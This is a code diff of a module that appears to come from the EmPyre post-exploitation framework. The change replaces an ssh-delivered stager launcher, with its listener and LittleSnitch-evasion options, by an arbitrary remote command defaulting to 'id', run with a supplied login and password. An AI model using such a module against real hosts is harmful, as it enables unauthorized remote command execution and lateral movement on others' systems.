@@ -12,7 +12,7 @@ class Module:
             'Author': ['@424f424f'],
 
             # more verbose multi-line description of the module
-            'Description': 'This module will send an launcher via ssh.',
+            'Description': 'This module will send a command via ssh.',
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -28,7 +28,7 @@ class Module:
 
             # list of any references/other comments
             'Comments': [
-                ''
+                'http://stackoverflow.com/questions/17118239/how-to-give-subprocess-a-password-and-get-stdout-at-the-same-time'
                             ]
         }
 
@@ -52,20 +52,10 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
+            'Command' : {
+                'Description'   :   'Command',
                 'Required'      :   True,
-                'Value'         :   ''
-            },
-            'LittleSnitch' : {
-                'Description'   :   'Set for stager LittleSnitch checks.',
-                'Required'      :   True,
-                'Value'         :   'True'
-            },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+                'Value'         :   'id'
             }
         }
 
@@ -87,22 +77,10 @@ class Module:
     def generate(self):
         login = self.options['Login']['Value']
         password = self.options['Password']['Value']
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        littleSnitch = self.options['LittleSnitch']['Value']
-
-        isEmpire = self.mainMenu.listeners.is_listener_empyre(listenerName)
-        if not isEmpire:
-            print helpers.color("[!] EmPyre listener required!")
-            return ""
+        command = self.options['Command']['Value']
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  littlesnitch=littleSnitch)
-        launcher = launcher.replace("'", "\\'")
-        launcher = launcher.replace('"', '\\"')
-        if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
-            return ""
+    
 
         script = """
 
@@ -139,5 +117,5 @@ status, output = wall('%s','%s')
 print status
 print output
 
-""" % (launcher, login, password)
+""" % (command, login, password)
         return script
